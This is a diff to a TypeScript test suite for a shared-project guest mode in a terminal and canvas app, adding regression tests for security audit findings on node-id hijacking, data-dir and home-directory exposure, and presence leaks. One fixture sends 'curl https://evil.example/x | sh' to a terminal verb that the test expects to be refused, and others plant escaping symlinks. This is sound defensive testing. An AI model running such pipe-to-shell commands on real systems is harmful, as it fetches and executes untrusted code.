@@ -7,6 +7,7 @@ import path from 'node:path'
 import { IPC } from '../../shared/ipc'
 import { encodePtyData } from '../../shared/rpc'
 import {
+  INTRODUCED_MAX,
   decideScopedAccess,
   filterScopedEvent,
   scopeForTest,
@@ -22,18 +23,21 @@ import type { RpcRequest } from '../../shared/rpc'
 let tmp: string
 let root: string // the shared project's folder
 let other: string // another project's folder
-let dataDir: string // this app's own data dir, planted INSIDE the shared root
+let dataDir: string // this app's own data dir, beside the shared root (a symlink inside points at it)
 beforeAll(() => {
   tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'scoped-guest-')))
   root = path.join(tmp, 'alpha')
   other = path.join(tmp, 'beta')
-  dataDir = path.join(root, 'appdata')
+  // A share that CONTAINS the data dir is refused whole (share-root.ts); the per-file data-dir jail
+  // is the belt behind it, reached here through a symlink planted inside the project.
+  dataDir = path.join(tmp, 'appdata')
   fs.mkdirSync(path.join(root, 'src'), { recursive: true })
   fs.mkdirSync(other, { recursive: true })
   fs.mkdirSync(dataDir, { recursive: true })
   fs.writeFileSync(path.join(root, 'src', 'a.ts'), 'a')
   fs.writeFileSync(path.join(other, 'secret.txt'), 's')
   fs.writeFileSync(path.join(dataDir, 'license.json'), '{}')
+  fs.symlinkSync(dataDir, path.join(root, 'appdata-link'))
   // A symlink planted INSIDE the project that points OUT of it, and a dangling one.
   fs.symlinkSync(path.join(other, 'secret.txt'), path.join(root, 'escape.txt'))
   fs.symlinkSync(path.join(other, 'not-yet.txt'), path.join(root, 'dangling.txt'))
@@ -95,6 +99,10 @@ describe('scoped guest — terminals', () => {
     })
     expect(d.allow && (d.args?.[0] as Record<string, unknown>).sshRemote).toBeUndefined()
   })
+  it('drops a guest-sent local-login mark (issue #1186: this machine\'s UI sets it, never a peer)', () => {
+    const d = decide(IPC.ptyCreate, { persistKey: 'a1', cols: 1, rows: 1, localOnSshCanvas: true })
+    expect(d.allow && (d.args?.[0] as Record<string, unknown>).localOnSshCanvas).toBeUndefined()
+  })
   it('forces requireRemote for an SSH project, whatever the guest sent (never a local shell)', () => {
     const remote = { ...deps(), projectIsRemote: (p: string) => p === 'alpha' }
     const d = decideScopedAccess('alpha', remote, IPC.ptyCreate, [
@@ -131,6 +139,10 @@ describe('scoped guest — files and git', () => {
   })
   it('never reaches the app data dir, even inside the shared root', () => {
     expect(allowed(IPC.fsRead, path.join(dataDir, 'license.json'))).toBe(false)
+    expect(allowed(IPC.fsRead, path.join(root, 'appdata-link', 'license.json'))).toBe(false)
+    // A shared folder that CONTAINS the data dir is not served at all (security audit F4).
+    const containing = decideScopedAccess('alpha', { ...deps(), hostDataDir: path.join(root, 'src') }, IPC.fsRead, [path.join(root, 'src', 'a.ts')])
+    expect(containing.allow === false && containing.message).toMatch(/data folder/)
   })
   it('writes a new file inside the root, refuses through a dangling symlink or an escaping dir', () => {
     expect(allowed(IPC.fsWrite, path.join(root, 'src', 'new', 'b.ts'), 'x')).toBe(true)
@@ -167,13 +179,218 @@ describe('scoped guest — canvas, board and GitHub', () => {
     expect(allowed(IPC.canvasMut, 'alpha', { op: 'remove', id: 'b1' })).toBe(false)
     expect(allowed(IPC.canvasMut, 'alpha', node('a1'))).toBe(true)
   })
-  it('a node the guest just created is in scope for its first terminal (before the host saves)', () => {
+  it('a node the guest just created gets its first terminal (before the host saves) — a SPAWN only', () => {
     const hooks = scopedGuestHooks('alpha', deps())
     const ask = (method: string, ...args: unknown[]) => hooks.access!(null as never, 'req', method, args)
     expect(ask(IPC.ptyCreate, { persistKey: 'fresh', cols: 1, rows: 1 }).allow).toBe(false)
     const upsert = { op: 'upsert', node: { id: 'fresh', kind: 'terminal', position: { x: 0, y: 0 } } }
     expect(ask(IPC.canvasMut, 'alpha', upsert).allow).toBe(true)
-    expect(ask(IPC.ptyCreate, { persistKey: 'fresh', cols: 1, rows: 1 }).allow).toBe(true)
+    const d = ask(IPC.ptyCreate, { persistKey: 'fresh', cols: 1, rows: 1 })
+    expect(d.allow).toBe(true)
+    // `newOnly`: core refuses to join or reattach anything already running under that name.
+    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
+  })
+})
+
+// ── Security audit F1 (2026-10): a node id the guest introduced is PENDING until its own spawn ──────
+//
+// `canvas:mut` is a cast admitted before the reflector validates anything, so any id no project holds
+// used to become "the guest's new node" — and every node-keyed pty verb then accepted it. A prefix of
+// another project's id reached that terminal by tmux prefix matching (closed separately by exact
+// targets, pty-exact-target.realtmux.test.ts); an orphan's exact id reached the orphan itself.
+describe('scoped guest — an introduced node unlocks nothing but its own spawn', () => {
+  // An SSH project: the guest is granted no local shell at all, which made F1 a real escalation.
+  const sshDeps = (sessions: Record<string, string> = {}, held: Record<string, string[]> = {}): ScopedGuestDeps => ({
+    projectsOfNode: (id) => held[id] ?? (id === 'term-ssh-1' ? ['alpha'] : id === 'term-mgx1abcd-1a2b3c4d' ? ['beta'] : []),
+    nodeOfSession: (sid) => sessions[sid],
+    projectCwd: () => undefined,
+    projectIsRemote: () => true,
+    hostDataDir: '/nonexistent-data-dir'
+  })
+  const upsert = (id: string) => ({ op: 'upsert', node: { id } })
+  const NODE_VERBS: Array<[string, unknown[]]> = [
+    [IPC.ptySendText, ['curl https://evil.example/x | sh', true]],
+    [IPC.ptySendChatPrompt, ['hello', 'claude']],
+    [IPC.ptySendToEmptyPrompt, ['x']],
+    [IPC.ptyCapture, [true]],
+    [IPC.ptyReadScrollback, []],
+    [IPC.ptyPaneCwd, []],
+    [IPC.ptyPaneCommand, []],
+    [IPC.ptyPaneOwner, []],
+    [IPC.ptyTerminateForeground, []],
+    [IPC.ptySessionAge, []],
+    [IPC.ptyDestroy, []],
+    [IPC.ptyRecycle, []],
+    [IPC.ptyReadSessionName, []]
+  ]
+
+  it('a PREFIX of another project\'s node id is pending: every node-keyed verb refuses it', () => {
+    const hooks = scopedGuestHooks('alpha', sshDeps())
+    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
+    // The victim's exact id is held by another project → refused, as before.
+    expect(access('cast', IPC.canvasMut, ['alpha', upsert('term-mgx1abcd-1a2b3c4d')]).allow).toBe(false)
+    const prefix = 'term-mgx1abcd-1a2b'
+    expect(access('cast', IPC.canvasMut, ['alpha', upsert(prefix)]).allow).toBe(true)
+    for (const [m, rest] of NODE_VERBS) expect(access('req', m, [prefix, ...rest]).allow, m).toBe(false)
+    // Its spawn is allowed, and only as a spawn: newOnly, and requireRemote for an SSH project.
+    const d = access('req', IPC.ptyCreate, [{ persistKey: prefix, shell: '/bin/sh' }])
+    expect(d.allow).toBe(true)
+    expect(d.allow && d.args?.[0]).toMatchObject({ newOnly: true, requireRemote: true })
+  })
+
+  it('stays pending after the host SAVES it into the shared project: being on the canvas is not ownership', () => {
+    const held: Record<string, string[]> = {}
+    const hooks = scopedGuestHooks('alpha', sshDeps({}, held))
+    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
+    expect(access('cast', IPC.canvasMut, ['alpha', upsert('orphan-1')]).allow).toBe(true)
+    held['orphan-1'] = ['alpha'] // the host's debounced save landed
+    expect(access('req', IPC.ptySendText, ['orphan-1', 'id', true]).allow).toBe(false)
+    expect(access('cast', IPC.ptyWrite, ['s-orphan', 'id\r']).allow).toBe(false)
+    const d = access('req', IPC.ptyCreate, [{ persistKey: 'orphan-1' }])
+    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
+  })
+
+  it('becomes the guest\'s own only on the core\'s word that ITS create spawned the session', () => {
+    const sessions: Record<string, string> = { 's-new': 'mine-1', 's-joined': 'mine-2' }
+    const hooks = scopedGuestHooks('alpha', sshDeps(sessions))
+    const access = (kind: 'req' | 'cast', m: string, a: unknown[]) => hooks.access!(null as never, kind, m, a)
+    access('cast', IPC.canvasMut, ['alpha', upsert('mine-1')])
+    access('cast', IPC.canvasMut, ['alpha', upsert('mine-2')])
+    // A refusal, a join (fresh:false), and a guessed fresh all leave it pending.
+    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: '', fresh: false, unavailable: 'new-only' })
+    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-joined', fresh: false })
+    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-joined', fresh: true, freshUnverified: true })
+    expect(access('req', IPC.ptySendText, ['mine-2', 'x', true]).allow).toBe(false)
+    // Its own fresh spawn: from now on a node of the shared project.
+    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-new', fresh: true })
+    expect(access('req', IPC.ptySendText, ['mine-1', 'x', true]).allow).toBe(true)
+    expect(access('cast', IPC.ptyWrite, ['s-new', 'x']).allow).toBe(true)
+    const d = access('req', IPC.ptyCreate, [{ persistKey: 'mine-1' }])
+    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBeUndefined()
+    expect(access('req', IPC.ptySendText, ['mine-2', 'x', true]).allow).toBe(false)
+  })
+
+  it('a pending node\'s terminal bytes and events never reach the guest; a created one\'s do', () => {
+    const sessions: Record<string, string> = { 's-pending': 'p-1', 's-mine': 'c-1' }
+    const hooks = scopedGuestHooks('alpha', sshDeps(sessions))
+    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('p-1')])
+    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('c-1')])
+    hooks.narrowResponse!(null as never, IPC.ptyCreate, { sessionId: 's-mine', fresh: true })
+    const bin: string[] = []
+    const text: string[] = []
+    const sink = hooks.wrapSink!(null as never, { sendText: (j) => text.push(j), sendBinary: (b) => bin.push(Buffer.from(b).toString()) })
+    sink.sendBinary(encodePtyData('s-pending', 'SECRET'))
+    sink.sendBinary(encodePtyData('s-mine', 'ok'))
+    expect(bin).toHaveLength(1)
+    sink.sendText(JSON.stringify({ t: 'ev', channel: IPC.agentStatus, args: [{ nodeId: 'p-1' }] }))
+    sink.sendText(JSON.stringify({ t: 'ev', channel: IPC.agentStatus, args: [{ nodeId: 'c-1' }] }))
+    expect(text).toHaveLength(1)
+  })
+
+  it('an id that aliases another session name, or past the bound, is not introduced', () => {
+    const hooks = scopedGuestHooks('alpha', sshDeps())
+    const cast = (id: string) => hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert(id)]).allow
+    // `sessionName` rewrites these characters, so two ids could name ONE tmux session.
+    for (const bad of ['a.b', 'a_b', 'a b', 'a/b', 'x'.repeat(129)]) expect(cast(bad), bad).toBe(false)
+    for (let i = 0; i < INTRODUCED_MAX; i++) expect(cast(`n-${i}`)).toBe(true)
+    expect(cast('n-one-too-many')).toBe(false)
+    // Its own pending nodes can still be moved.
+    expect(cast('n-0')).toBe(true)
+  })
+
+  it('earlier item (b): an orphan exact id is pending too — its create may only spawn, never join', () => {
+    const hooks = scopedGuestHooks('alpha', { ...deps(), projectsOfNode: () => [] })
+    expect(hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('term-orphan-1')]).allow).toBe(true)
+    const d = hooks.access!(null as never, 'req', IPC.ptyCreate, [{ persistKey: 'term-orphan-1' }])
+    expect(d.allow && (d.args?.[0] as Record<string, unknown>).newOnly).toBe(true)
+    expect(hooks.access!(null as never, 'req', IPC.ptyCapture, ['term-orphan-1', true]).allow).toBe(false)
+  })
+
+  it('a pending id another project has since taken (a git pull) is refused outright', () => {
+    const held: Record<string, string[]> = {}
+    const hooks = scopedGuestHooks('alpha', sshDeps({}, held))
+    hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('taken-1')])
+    held['taken-1'] = ['beta']
+    expect(hooks.access!(null as never, 'req', IPC.ptyCreate, [{ persistKey: 'taken-1' }]).allow).toBe(false)
+    expect(hooks.access!(null as never, 'cast', IPC.canvasMut, ['alpha', upsert('taken-1')]).allow).toBe(false)
+  })
+})
+
+describe('scoped guest — presence is the shared project\'s only (security audit (a))', () => {
+  const ev = (channel: string, ...args: unknown[]) => JSON.stringify({ t: 'ev', channel, args })
+  const peer = (clientId: number, projectId: string | null, extra: Record<string, unknown> = {}) => ({
+    clientId, name: `p${clientId}`, color: '#5ac8fa', cursor: { x: 1, y: 2 }, focus: null, chat: null,
+    typing: null, projectId, dino: null, kind: 'desktop', ...extra
+  })
+  const rig = () => {
+    const hooks = scopedGuestHooks('alpha', deps())
+    const got: Array<{ channel: string; arg: unknown }> = []
+    const sink = hooks.wrapSink!(null as never, {
+      sendText: (j) => { const m = JSON.parse(j); got.push({ channel: m.channel, arg: m.args[0] }) },
+      sendBinary: () => {}
+    })
+    return { sink, got }
+  }
+  it('a sync lists only peers on the shared project, with node references outside it nulled', () => {
+    const { sink, got } = rig()
+    sink.sendText(ev(IPC.presenceSync, [
+      peer(1, 'beta', { focus: 'b1', chat: 'the staging db password is hunter2', typing: { nodeId: 'b1', at: 1 } }),
+      peer(2, 'alpha', { focus: 'a1', typing: { nodeId: 'b1', at: 1 } }),
+      peer(3, null)
+    ]))
+    expect(got).toEqual([{ channel: IPC.presenceSync, arg: [expect.objectContaining({ clientId: 2, focus: 'a1', typing: null })] }])
+    expect(JSON.stringify(got)).not.toContain('hunter2')
+    expect(JSON.stringify(got)).not.toContain('b1')
+  })
+  it('a peer moving in is joined, moving out is left, and nothing in between leaks', () => {
+    const { sink, got } = rig()
+    sink.sendText(ev(IPC.presenceSync, [peer(1, 'beta')]))
+    got.length = 0
+    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { chat: 'secret elsewhere', focus: 'b1' } }))
+    expect(got).toEqual([])
+    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { projectId: 'alpha' } }))
+    expect(got).toEqual([{ channel: IPC.presencePeer, arg: { op: 'join', peer: expect.objectContaining({ clientId: 1, projectId: 'alpha', focus: null }) } }])
+    expect(JSON.stringify(got)).not.toContain('secret elsewhere')
+    got.length = 0
+    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { focus: 'a1' } }))
+    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { focus: 'b1' } }))
+    expect(got.map((g) => g.arg)).toEqual([
+      { op: 'update', clientId: 1, patch: { focus: 'a1' } },
+      { op: 'update', clientId: 1, patch: { focus: null } }
+    ])
+    got.length = 0
+    sink.sendText(ev(IPC.presencePeer, { op: 'update', clientId: 1, patch: { projectId: 'beta' } }))
+    expect(got).toEqual([{ channel: IPC.presencePeer, arg: { op: 'leave', clientId: 1 } }])
+    got.length = 0
+    sink.sendText(ev(IPC.presencePeer, { op: 'join', peer: peer(9, 'beta') }))
+    sink.sendText(ev(IPC.presencePeer, { op: 'leave', clientId: 9 }))
+    expect(got).toEqual([])
+  })
+  it('context:update reaches the guest only for a session of the shared project', () => {
+    const hooks = scopedGuestHooks('alpha', { ...deps(), nodesOfAgentSession: (sid) => (sid === 'sa' ? ['a1'] : sid === 'sb' ? ['b1'] : []) })
+    const got: string[] = []
+    const sink = hooks.wrapSink!(null as never, { sendText: (j) => got.push(j), sendBinary: () => {} })
+    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'sa', usedTokens: 1, model: 'm' }))
+    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'sb', usedTokens: 1, model: 'm' }))
+    sink.sendText(ev(IPC.contextUpdate, { sessionId: 'unknown', usedTokens: 1, model: 'm' }))
+    sink.sendText(ev(IPC.contextUpdate, { nodeId: 'b1', sessionId: 'sa', usedTokens: 1, model: 'm' }))
+    expect(got).toHaveLength(1)
+    expect(got[0]).toContain('"sa"')
+  })
+})
+
+describe('scoped guest — a share rooted at the home directory or the disk root is never served (F4)', () => {
+  it('refuses every request when the shared folder is the home directory, or contains it', () => {
+    for (const cwd of [tmp, root]) {
+      const home = cwd === tmp ? path.join(tmp, 'alpha') : root // root itself, or an ancestor of it
+      const d = decideScopedAccess('alpha', { ...deps(), homeDir: home, projectCwd: () => cwd }, IPC.fsRead, [path.join(root, 'src', 'a.ts')])
+      expect(d.allow).toBe(false)
+      expect(d.allow === false && d.message).toMatch(/home directory/)
+    }
+    const slash = decideScopedAccess('alpha', { ...deps(), projectCwd: () => '/' }, IPC.workspaceLoad, [])
+    expect(slash.allow === false && slash.message).toMatch(/root of the disk/)
+    // An ordinary project folder BELOW the home directory is served as before.
+    expect(decideScopedAccess('alpha', { ...deps(), homeDir: tmp }, IPC.fsRead, [path.join(root, 'src', 'a.ts')]).allow).toBe(true)
   })
 })
 
@@ -192,6 +409,14 @@ describe('scoped guest — what it receives', () => {
     expect(filterScopedEvent(ev(IPC.workspaceExternalChange, { id: 'beta' }), s, owners)).toBe(false)
     // A hosted team's shared set: a viewer of a hosted team receives it, a Team Access guest never.
     expect(filterScopedEvent(ev(IPC.relayHostedSharedChanged, { projectIds: ['alpha', 'beta'] }), s, owners)).toBe(false)
+  })
+  it("a scoped guest's snapshot holds only its project's nodes", () => {
+    const hooks = scopedGuestHooks('alpha', deps())
+    const session = null as never
+    const mine = 'a1'
+    const theirs = 'b1'
+    expect(allowed(IPC.agentStatusSnapshot)).toBe(true)
+    expect(hooks.narrowResponse!(session, IPC.agentStatusSnapshot, [{ nodeId: mine }, { nodeId: theirs }])).toEqual([{ nodeId: mine }])
   })
   it('delivers terminal bytes only for the shared project\'s sessions', () => {
     const hooks = scopedGuestHooks('alpha', deps())
